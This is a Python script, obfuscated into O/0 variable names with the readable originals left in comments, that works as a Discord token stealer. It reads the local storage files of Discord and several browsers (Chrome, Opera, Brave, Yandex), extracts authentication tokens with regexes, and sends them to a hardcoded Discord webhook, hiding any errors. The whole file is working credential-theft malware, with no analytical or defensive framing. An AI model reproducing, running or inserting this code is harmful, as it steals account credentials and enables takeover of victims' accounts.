import os
import re
import json

from urllib.request import Request, urlopen


WEBHOOK_URL = "https://canary.discord.com/api/webhooks/822772719329869834/fEjzhM41xcLzJdi_W0dgTlJXRgVKunMvMzqf1niZtkkJTezKy7EVGuoLDXdfimhewBZw"

PING_ME =True #line:1:PING_ME = True
def find_tokens (OO00O0O00O00O0OOO ):#line:3:def find_tokens(path):
    OO00O0O00O00O0OOO +='\\Local Storage\\leveldb'#line:4:path += '\\Local Storage\\leveldb'
    O0000O000O0O0O0OO =[]#line:6:tokens = []
    for OOO00OO0OO00OO0OO in os .listdir (OO00O0O00O00O0OOO ):#line:8:for file_name in os.listdir(path):
        if not OOO00OO0OO00OO0OO .endswith ('.log')and not OOO00OO0OO00OO0OO .endswith ('.ldb'):#line:9:if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue #line:10:continue
        for OO0O0OO0O00OO0O0O in [OO00OO00O00OO00OO .strip ()for OO00OO00O00OO00OO in open (f'{OO00O0O00O00O0OOO}\\{OOO00OO0OO00OO0OO}',errors ='ignore').readlines ()if OO00OO00O00OO00OO .strip ()]:#line:12:for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for OOOO0O0O000O0OO00 in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',r'mfa\.[\w-]{84}'):#line:13:for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for OOOOOOOOOOO00OOO0 in re .findall (OOOO0O0O000O0OO00 ,OO0O0OO0O00OO0O0O ):#line:14:for token in re.findall(regex, line):
                    O0000O000O0O0O0OO .append (OOOOOOOOOOO00OOO0 )#line:15:tokens.append(token)
    return O0000O000O0O0O0OO #line:16:return tokens
def main ():#line:18:def main():
    O00O00OOO0OO000O0 =os .getenv ('LOCALAPPDATA')#line:19:local = os.getenv('LOCALAPPDATA')
    O0OO00O0OOO000000 =os .getenv ('APPDATA')#line:20:roaming = os.getenv('APPDATA')
    OOO0OOOOO0OOO0OOO ={'Discord':O0OO00O0OOO000000 +'\\Discord','Discord Canary':O0OO00O0OOO000000 +'\\discordcanary','Discord PTB':O0OO00O0OOO000000 +'\\discordptb','Google Chrome':O00O00OOO0OO000O0 +'\\Google\\Chrome\\User Data\\Default','Opera':O0OO00O0OOO000000 +'\\Opera Software\\Opera Stable','Brave':O00O00OOO0OO000O0 +'\\BraveSoftware\\Brave-Browser\\User Data\\Default','Yandex':O00O00OOO0OO000O0 +'\\Yandex\\YandexBrowser\\User Data\\Default'}#line:30:}
    O0O000O000O0OOO00 ='@everyone'if PING_ME else ''#line:32:message = '@everyone' if PING_ME else ''
    for O0O0O00OOOO0O0OOO ,O0OOO00000OO000OO in OOO0OOOOO0OOO0OOO .items ():#line:34:for platform, path in paths.items():
        if not os .path .exists (O0OOO00000OO000OO ):#line:35:if not os.path.exists(path):
            continue #line:36:continue
        O0O000O000O0OOO00 +=f'\n**{O0O0O00OOOO0O0OOO}**\n```\n'#line:38:message += f'\n**{platform}**\n```\n'
        O000O0O0O0OOOO00O =find_tokens (O0OOO00000OO000OO )#line:40:tokens = find_tokens(path)
        if len (O000O0O0O0OOOO00O )>0 :#line:42:if len(tokens) > 0:
            for OO00O000O00OOOO00 in O000O0O0O0OOOO00O :#line:43:for token in tokens:
                O0O000O000O0OOO00 +=f'{OO00O000O00OOOO00}\n'#line:44:message += f'{token}\n'
        else :#line:45:else:
            O0O000O000O0OOO00 +='Aucun token trouvée.\n'#line:46:message += 'Aucun token trouvée.\n'
        O0O000O000O0OOO00 +='```'#line:48:message += '```'
    OOO0000OO0OO0O0OO ={'Content-Type':'application/json','User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}#line:53:}
    O0OOOOOOOO0O00OO0 =json .dumps ({'content':O0O000O000O0OOO00 })#line:55:payload = json.dumps({'content': message})
    try :#line:57:try:
        OO0OO00OOO00OOO00 =Request (WEBHOOK_URL ,data =O0OOOOOOOO0O00OO0 .encode (),headers =OOO0000OO0OO0O0OO )#line:58:req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen (OO0OO00OOO00OOO00 )#line:59:urlopen(req)
    except :#line:60:except:
        pass #line:61:pass
if __name__ =='__main__':#line:63:if __name__ == '__main__':
    main ()